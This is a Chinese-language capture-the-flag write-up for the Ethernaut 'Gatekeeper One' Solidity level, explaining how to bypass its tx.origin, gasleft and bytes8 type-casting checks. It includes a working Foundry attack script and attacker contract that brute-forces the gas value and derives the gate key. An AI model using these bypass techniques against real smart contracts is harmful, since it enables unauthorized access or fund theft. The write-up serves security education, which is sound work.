# Level 13 - Gatekeeper One

## 題目
[Gatekeeper One](https://ethernaut.openzeppelin.com/level/0xb5858B8EDE0030e46C0Ac1aaAedea8Fb71EF423C)

### 通關條件
跨越守衛的守衛並且註冊成為參賽者吧

### 提示
- 回憶一下你在 [Telephone](https://hackmd.io/@D13/ethernaut4) 和 [Token](https://hackmd.io/@D13/ethernaut5) 關卡學到了什麼
- 可以去翻翻 Solidity 文件，更深入的了解一下 `gasleft()` 函式的資訊（參見 [Units and Global Variables](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html) 和 [External Function Calls](https://docs.soliditylang.org/en/v0.8.3/control-structures.html#external-function-calls)）

### 合約內容
```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract GatekeeperOne {
    address public entrant;

    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }

    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }

    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
        _;
    }

    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}
```
## 筆記
`gasleft()` 用於確認目前剩下的 gas 有多少，透過這個方式紀錄合約會消耗多少 gas，實際用法可以參考 [Solidity Gasleft](https://www.rareskills.io/post/solidity-gasleft)
>[!Tip]
>Gas Fee 就是區塊鏈交易或執行智能合約時要支付的費用；跑合約、交易的手續費。

---

題目要我們成為參賽者，也就是呼叫 24 行的 `enter(bytes8 _gateKey)`，呼叫之前還會先經過 3 個 `modifier`，通過的方法分別是：

### 通過 `gateOne()`
```solidity=7
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
```
這條件在 [Telephone](https://hackmd.io/@D13/ethernaut4) 就有實現過，只要寫另一個合約去呼叫關卡合約就可以通過
### 通過 `gateTwo()`
```solidity=12
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
```
`gateTwo()` 的條件是必須在 run 到這的時候剩餘的 gas 費用必須要可以被 8191 整除，我們可以透過 for 迴圈不斷測試找到符合的 gas（跑迴圈本身很消耗 gas，建議在本地端跑完後再改用常數呼叫上鏈提交關卡）
### 通過 `gateThree(bytes8 _gateKey)`
```solidity=17
    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
        require( `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)`), "GatekeeperOne: invalid gateThree part three");
        _;
    }
```
`gateThree(bytes8 _gateKey)` 又分成三個條件，都是要針對 `_gateKey` 做型態轉換後的值進行比較，跟 [Privacy](https://hackmd.io/@D13/ethernaut12) 那題一樣，只是更複雜一點，一條一條查看：
#### `uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))`
![image](/writeup/img/13_GateThree1.png)
在做 `==` 判斷時，比較小的型態會被轉換成大的，所以右邊的 `_gateKey` 雖然最後是 `uint16` 但因為要比較的關係所以會變成 `uint32`，但他已經失去 2 bytes 的資料，所以它的前方會補 0（詳細變化可以參考上圖右邊綠色方塊）
要達成第一個條件，`_gateKey` 的第 5, 6 byte 一開始就必須為 0，這樣丟失再補回來後也會跟左邊黃框的部分一樣
#### `uint32(uint64(_gateKey)) != uint64(_gateKey)`
![image](/writeup/img/13_GateThree2.png)
第二個條件是要不相等，那透過上圖可以看出來只要 `_gateKey` 的初始值在 1-4 byte 有值就可以達到這個效果，因為左邊黃框部分 `_gateKey` 會被丟棄前 4 個 bytes 後補 0，所以會不一樣。
#### `uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)`
![image](/writeup/img/13_GateThree3.png)
第三個條件其實跟第一條很像，就是倒數 3, 4 byte 要是 0 就可以符合，但這邊是用 `tx.origin`，也就是我們的地址。

綜合上面三個條件也就是說 `_gateKey` 要等於 `tx.origin` 且倒數 3, 4 byte 要是 0。這邊只要透過 AND 運算，就像濾波器一樣把不要的部份過濾掉就可以得到符合三個條件的值了：
```solidity=
bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF
```
攻擊合約如下（不要忘記確認 gas 的 for 迴圈不要上鏈測試）：
```solidity=
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "../src/Ethernaut Challenge/13_GatekeeperOne.sol";

contract ExploitScript is Script {

    function run() external {
        vm.startBroadcast();

        GatekeeperOneAttacker attacker = new GatekeeperOneAttacker(your_challenge_address);    
        attacker.attack();

        vm.stopBroadcast();
    }
}

contract GatekeeperOneAttacker {
    GatekeeperOne public level13;

    constructor(address _target) {
        level13 = GatekeeperOne(_target);
    }
    
    function attack() public {
        bytes8 _gateKey =  bytes8(uint64(uint160(tx.origin))) & 0xffffffff0000ffff;
        /* local test
        for (uint256 i = 0; i < 8191; i++) { 
            (bool result,) = address(level13).call{gas:i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
            if (result) {
                console.log(i);
                break;
            }
        }
        */
        address(level13).call{gas:256 + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
    }
}
```